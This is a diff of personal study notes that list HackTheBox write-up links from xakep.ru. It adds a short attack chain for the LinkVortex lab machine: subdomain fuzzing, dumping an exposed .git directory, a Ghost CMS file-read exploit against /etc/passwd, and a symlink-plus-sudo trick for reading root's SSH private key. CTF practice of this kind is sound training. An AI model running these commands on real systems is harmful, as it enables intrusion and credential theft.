@@ -8,11 +8,29 @@ https://xakep.ru/2025/02/17/htb-cicada/
 https://xakep.ru/2024/12/16/htb-compiled/
 https://xakep.ru/2025/05/26/htb-escapetwo/
 https://xakep.ru/2025/06/16/htb-infiltrator/
+https://xakep.ru/2025/06/30/htb-haze/
 
 
 ===============================================================
-
 # READ IT
+===============================================================
+## Checker
+https://xakep.ru/2025/06/02/htb-checker/
+
+## Titanic
+https://xakep.ru/2025/06/23/htb-titanic/
+
+## LinkVortex
+https://xakep.ru/2025/04/14/htb-linkvortex/
+
+ffuf -u http://linkvortex.htb/ -H 'Host: FUZZ.linkvortex.htb' -w subdomains-top1million-110000.txt -t 128 -fc 301
+git-dumper http://dev.linkvortex.htb/.git/
+CMS Ghost
+python3 ghost_fileread.py -t http://linkvortex.htb/ -u admin@linkvortex.htb -p OctopiFociPilfer45 -f /etc/passwd
+
+ln -s /root/.ssh/id_rsa test.txt
+ln -s /home/bob/test.txt test.png
+sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/test.png
 
 ## HEAL
 https://xakep.ru/2025/05/19/htb-heal/
@@ -61,7 +79,7 @@ LPE - mobSF chmod 4777 /bin/bash
 
 # PASSED
 
-## HTB sSUPPORT
+## HTB SUPPORT
 
 https://xakep.ru/2022/12/19/htb-support/
 
